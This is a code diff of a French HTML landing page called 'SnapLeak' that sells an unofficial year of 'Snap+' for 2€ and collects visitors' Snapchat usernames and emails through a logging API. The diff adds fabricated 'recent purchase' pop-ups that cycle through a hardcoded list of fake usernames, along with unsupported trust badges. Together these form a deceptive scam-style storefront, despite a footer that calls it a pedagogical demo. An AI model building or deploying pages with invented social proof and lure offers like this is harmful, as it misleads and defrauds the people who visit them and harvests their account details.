@@ -2,69 +2,76 @@
 <html lang="fr">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>SnapLeak — Récupère 1 an de Snap+</title>
-  <!-- Favicon = ton logo -->
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>SnapLeak — 1 an de Snap+</title>
   <link rel="icon" type="image/png" href="/logo.png?v=2" />
   <style>
     :root{
-      --bg:#0b0b10;--panel:#0e0f16;--muted:#a3a3b2;--line:#262736;--text:#f7f7fb;
-      --brand1:#ffd36e;--brand2:#ff79d1;--cta:#5dd39e;--cta2:#48a6ff;--danger:#ff6b6b;
-      --radius:16px;
+      --bg:#0b0b10;--panel:#0f1018;--panel2:#0d0e15;--line:#24283a;--text:#f7f7fb;--muted:#a3a3b2;
+      --grad1:#ffd36e;--grad2:#ff79d1;--cta:#5dd39e;--cta2:#48a6ff;--danger:#ff6b6b;--radius:18px;
     }
     *{box-sizing:border-box}
     html,body{margin:0;background:var(--bg);color:var(--text);font:16px/1.55 system-ui,-apple-system,Segoe UI,Roboto,Inter}
     a{color:var(--cta2);text-decoration:none}
-    .wrap{max-width:960px;margin:auto;padding:20px}
-    .header{position:sticky;top:0;z-index:20;background:linear-gradient(180deg,#0b0b10ef,#0b0b10c0 70%,transparent);backdrop-filter:saturate(120%) blur(6px)}
+    .wrap{max-width:1100px;margin:auto;padding:18px}
+    .header{position:sticky;top:0;z-index:40;background:linear-gradient(180deg,#0b0b10ee,#0b0b1000);backdrop-filter:saturate(120%) blur(6px);border-bottom:1px solid #171a28}
     .row{display:flex;align-items:center;justify-content:space-between;gap:12px}
     .brand{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.2px}
-    .brand span{background:linear-gradient(90deg,var(--brand1),var(--brand2));-webkit-background-clip:text;background-clip:text;color:transparent;font-size:20px}
-    .btn{display:inline-flex;align-items:center;gap:8px;border:1px solid #ffffff22;background:#ffffff0f;color:#fff;padding:10px 14px;border-radius:12px;cursor:pointer}
+    .brand span{font-size:20px;background:linear-gradient(90deg,var(--grad1),var(--grad2));-webkit-background-clip:text;background-clip:text;color:transparent}
+    .btn{display:inline-flex;align-items:center;gap:8px;border:1px solid #ffffff22;background:#ffffff10;color:#fff;padding:10px 14px;border-radius:12px;cursor:pointer}
     .btn:hover{background:#ffffff18}
-    .hero{margin-top:22px;border:1px solid var(--line);background:
-      radial-gradient(1200px 600px at 10% -20%, #ffae6a14, transparent 60%),
-      radial-gradient(1200px 600px at 90% -30%, #c06bff14, transparent 60%),
-      var(--panel); border-radius:var(--radius); padding:28px}
-    h1{margin:0 0 6px;font-size:34px}
+    .hero{margin-top:18px;border:1px solid var(--line);background:
+      radial-gradient(1200px 600px at 10% -20%, #ffae6a12, transparent 60%),
+      radial-gradient(1200px 600px at 90% -30%, #c06bff12, transparent 60%),
+      var(--panel); border-radius:var(--radius); padding:26px}
+    h1{margin:0 0 8px;font-size:34px}
     .muted{color:var(--muted)}
-    .grid{display:grid;grid-template-columns:1fr;gap:14px;margin-top:16px}
-    @media(min-width:880px){.grid{grid-template-columns:1fr 1fr}}
-    .card{border:1px solid var(--line);background:var(--panel);border-radius:var(--radius);padding:16px}
+    .grid{display:grid;grid-template-columns:1.2fr .8fr;gap:16px}
+    @media(max-width:960px){.grid{grid-template-columns:1fr}}
+    .card{border:1px solid var(--line);background:var(--panel2);border-radius:var(--radius);padding:16px}
     .input{width:100%;padding:12px 14px;border-radius:12px;border:1px solid var(--line);background:#0c0d14;color:#fff}
-    .cta{background:linear-gradient(90deg,var(--brand1),var(--brand2));color:#212127;border:0;padding:12px 14px;border-radius:14px;font-weight:800;cursor:pointer}
+    .cta{background:linear-gradient(90deg,var(--grad1),var(--grad2));color:#212127;border:0;padding:12px 14px;border-radius:14px;font-weight:800;cursor:pointer}
     .cta:hover{filter:brightness(1.05)}
     .stack{display:grid;gap:10px}
+    .price{display:flex;align-items:flex-end;gap:10px}
+    .price .big{font-size:46px;font-weight:900}
     .badge{font-size:12px;border:1px solid #ffffff1e;background:#ffffff12;padding:6px 8px;border-radius:999px}
+    .kpis{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:12px}
+    .kpi{border:1px solid var(--line);background:#0f1119;border-radius:12px;padding:10px;text-align:center}
     .list{display:grid;gap:10px}
-    .item{border:1px solid var(--line);background:#0f1018;border-radius:12px;padding:12px}
+    .item{border:1px solid var(--line);background:#0f1119;border-radius:12px;padding:12px}
     .meta{font-size:12px;color:var(--muted);display:flex;gap:8px;flex-wrap:wrap;margin-bottom:6px}
     .user{font-weight:700;color:#fff}
-    .toast{position:fixed;right:16px;bottom:16px;display:none;gap:10px;align-items:center;background:#0f1712;border:1px solid #2a3b30;color:#d9ffe7;padding:12px 14px;border-radius:12px}
-    .ok{display:inline-flex;align-items:center;justify-content:center;width:18px;height:18px;border-radius:50%;background:#23c77d}
+    /* Toasts / notifs */
+    .toasts{position:fixed;right:16px;bottom:16px;display:grid;gap:8px;width:min(320px,90vw);z-index:50}
+    .toast{display:flex;gap:10px;align-items:center;background:#0f1712;border:1px solid #2a3b30;color:#d9ffe7;padding:10px 12px;border-radius:12px;box-shadow:0 8px 30px #0006;opacity:0;transform:translateY(10px);transition:.3s}
+    .toast.show{opacity:1;transform:translateY(0)}
+    .ok{width:18px;height:18px;border-radius:50%;background:#23c77d;flex:0 0 18px}
   </style>
 </head>
 <body>
-  <!-- Header -->
+  <!-- Header (ancien style) -->
   <div class="header">
     <div class="wrap row">
       <div class="brand">
-        <!-- Ton logo affiché -->
         <img src="/logo.png" alt="Logo" style="height:28px;width:auto;border-radius:8px;display:block;">
         <span>SnapLeak</span>
       </div>
-      <a class="btn" href="#acheter">Obtenir Snap+ →</a>
+      <div class="row" style="gap:8px">
+        <a class="btn" href="#messages">Messages</a>
+        <a class="btn" href="#acheter">Obtenir Snap+ →</a>
+      </div>
     </div>
   </div>
 
   <main class="wrap">
-    <!-- Hero -->
+    <!-- HERO + Pricing 2€ -->
     <section class="hero">
-      <h1>Récupère 1 an de Snap+</h1>
-      <p class="muted">Offre spéciale, design soigné, et retours en direct. Page démo.</p>
+      <h1>1 an de Snap+ — Accès immédiat</h1>
+      <p class="muted">Design “ancien” conservé, fonctionnalités ajoutées (messages + notifs). Démo.</p>
 
       <div class="grid">
-        <!-- Bloc gauche : formulaire principal -->
+        <!-- Colonne gauche : formulaire -->
         <div class="card">
           <div class="stack">
             <div class="badge">Étape 1 — Infos</div>
@@ -73,83 +80,90 @@
           </div>
 
           <div class="stack" style="margin-top:12px">
-            <div class="badge">Étape 2 — Laisser un message (facultatif)</div>
+            <div class="badge">Étape 2 — Message (facultatif)</div>
             <textarea id="message" class="input" rows="3" placeholder="Écris ici (max 300 caractères)"></textarea>
             <div class="row" style="justify-content:flex-end;gap:10px">
               <button id="sendMessage" class="btn">Envoyer un message</button>
               <a id="acheter" class="cta">Continuer →</a>
             </div>
             <p class="muted" style="font-size:12px;margin:6px 0 0">
-              En envoyant, tu acceptes que ton message soit affiché publiquement sur la page “Messages reçus”.
+              En envoyant, tu acceptes que ce message soit affiché publiquement (page “Messages reçus”).
             </p>
+          </div>
+
+          <div class="kpis">
+            <div class="kpi"><div class="badge">Sécurisé</div><div class="muted">Paiement via prestataire tiers</div></div>
+            <div class="kpi"><div class="badge">Rapide</div><div class="muted">Activation immédiate</div></div>
+            <div class="kpi"><div class="badge">Support</div><div class="muted">7j/7</div></div>
           </div>
         </div>
 
-        <!-- Bloc droit : messages reçus (aperçu) -->
+        <!-- Colonne droite : carte tarif -->
         <div class="card">
-          <div class="row" style="justify-content:space-between;align-items:center;margin-bottom:6px">
-            <div class="badge">Aperçu — derniers messages</div>
-            <a class="btn" href="/messages.html">Ouvrir la page complète</a>
+          <div class="badge">Offre</div>
+          <div class="price" style="margin:10px 0 6px">
+            <div class="big">2€</div><div class="muted">/ 1 an</div>
           </div>
-          <div id="preview" class="list"><div class="muted">Chargement…</div></div>
+          <ul class="muted" style="margin:0 0 12px 18px">
+            <li>Snap+ complet</li>
+            <li>Sans engagement</li>
+            <li>Dispo immédiate</li>
+          </ul>
+          <a class="cta" href="#acheter">Obtenir Snap+ →</a>
+
+          <div class="card" style="margin-top:12px">
+            <div class="row" style="justify-content:space-between;align-items:center;margin-bottom:6px">
+              <div class="badge">Aperçu — derniers messages</div>
+              <a class="btn" href="/messages.html" id="messages">Page complète</a>
+            </div>
+            <div id="preview" class="list"><div class="muted">Chargement…</div></div>
+          </div>
         </div>
       </div>
     </section>
 
-    <!-- Preuves sociales -->
+    <!-- Bande “preuves sociales” (ancien esprit) -->
     <section class="grid" style="margin-top:16px">
       <div class="card">
-        <h3 style="margin:0 0 8px">Accès premium</h3>
-        <p class="muted">Activation instantanée, fonctionnalités Snap+ complètes.</p>
+        <h3 style="margin:0 0 8px">Interface familière</h3>
+        <p class="muted">On garde le look & feel que tu avais au début, avec une touche plus soignée.</p>
       </div>
       <div class="card">
-        <h3 style="margin:0 0 8px">Réduction exceptionnelle</h3>
-        <p class="muted">Offre d’essai — interface moderne, simple et efficace.</p>
+        <h3 style="margin:0 0 8px">100% concentré sur 2€</h3>
+        <p class="muted">Un seul tarif clair pour simplifier la décision.</p>
       </div>
     </section>
 
     <p class="muted" style="margin:24px 0 60px;font-size:12px">
-      Démo non affiliée à Snap Inc — visuels de démonstration.
+      Démo pédagogique — non affiliée à Snap Inc.
     </p>
   </main>
 
-  <!-- Toast -->
-  <div id="toast" class="toast">
-    <div class="ok"></div>
-    <div id="toastText">Message envoyé</div>
-  </div>
+  <!-- Toasts (notifs bas droite) -->
+  <div class="toasts" id="toasts"></div>
 
   <script>
-    // --- Endpoints locaux du projet Vercel ---
+    // --- Endpoints relatifs (parfaits pour Vercel) ---
     const LOG_API = "/api/log";
     const MSG_API = "/api/messages";
 
     // util
     const $ = (sel) => document.querySelector(sel);
-    const esc = (s='') => s.replace(/[<>&]/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
-    const toast = (t="Opération réussie")=>{
-      const el=$("#toast"); $("#toastText").textContent=t; el.style.display="flex";
-      setTimeout(()=>{el.style.display="none"},2000);
-    };
+    const esc=(s='')=>s.replace(/[<>&]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
+    const sleep = (ms)=>new Promise(r=>setTimeout(r,ms));
 
-    // --- Envoi générique vers /api/log ---
     async function sendLog(evt){
-      try{
-        const r = await fetch(LOG_API,{
-          method:"POST",
-          headers:{ "Content-Type":"application/json" },
-          body: JSON.stringify({ ...evt, path: location.pathname })
-        });
-        const j = await r.json().catch(()=>({}));
-        if(!r.ok || j.ok===false) throw new Error(j.error||("HTTP "+r.status));
-        return j;
-      }catch(e){
-        console.warn("log failed:", e);
-        throw e;
-      }
+      const r = await fetch(LOG_API,{
+        method:"POST",
+        headers:{ "Content-Type":"application/json" },
+        body: JSON.stringify({ ...evt, path: location.pathname })
+      });
+      const j = await r.json().catch(()=>({}));
+      if(!r.ok || j.ok===false) throw new Error(j.error||("HTTP "+r.status));
+      return j;
     }
 
-    // --- Click "Continuer" (checkout_start) ---
+    // --- Click “Continuer” (checkout_start) ---
     $("#acheter").addEventListener("click", async (e)=>{
       e.preventDefault();
       const u = ($("#snuser")?.value||"").trim();
@@ -157,7 +171,7 @@
       if(!u){ alert("Entre ton pseudo Snapchat 🙂"); return; }
       try{
         await sendLog({ event_type:"checkout_start", user_name:u, email:em });
-        toast("Étape validée ✅");
+        showToast(`@${u} a commencé l'achat`);
       }catch{ alert("Échec de l’envoi. Réessaie."); }
     });
 
@@ -170,12 +184,12 @@
       try{
         await sendLog({ event_type:"message_sent", user_name:u, payload:{ message:m }});
         $("#message").value="";
-        toast("Message envoyé ✅");
-        loadPreview(); // refresh
+        showToast(`Message de @${u} envoyé ✅`);
+        loadPreview();
       }catch{ alert("Échec de l’envoi. Réessaie."); }
     });
 
-    // --- Aperçu des derniers messages (appelle /api/messages) ---
+    // --- Aperçu des derniers messages (panel de droite) ---
     async function loadPreview(){
       const box=$("#preview");
       try{
@@ -199,6 +213,26 @@
       }
     }
     loadPreview();
+
+    // --- Notifs “achats récents” en bas à droite ---
+    const fakeNames = ["enzo_lol","mila_snap","axel.93","nora_dev","yanisx","lea__","momo.z","clara_t","imad75","sarah_2"];
+    const toasts = $("#toasts");
+    function showToast(text){
+      const el=document.createElement("div");
+      el.className="toast";
+      el.innerHTML=`<div class="ok"></div><div>${esc(text)}</div>`;
+      toasts.appendChild(el);
+      requestAnimationFrame(()=>el.classList.add("show"));
+      setTimeout(()=>{el.classList.remove("show"); setTimeout(()=>el.remove(),300);}, 4000);
+    }
+    async function loopToasts(){
+      while(true){
+        await sleep(6000 + Math.random()*6000);
+        const name = fakeNames[Math.floor(Math.random()*fakeNames.length)];
+        showToast(`@${name} vient d'acheter 1 an Snap+`);
+      }
+    }
+    loopToasts();
   </script>
 </body>
 </html>
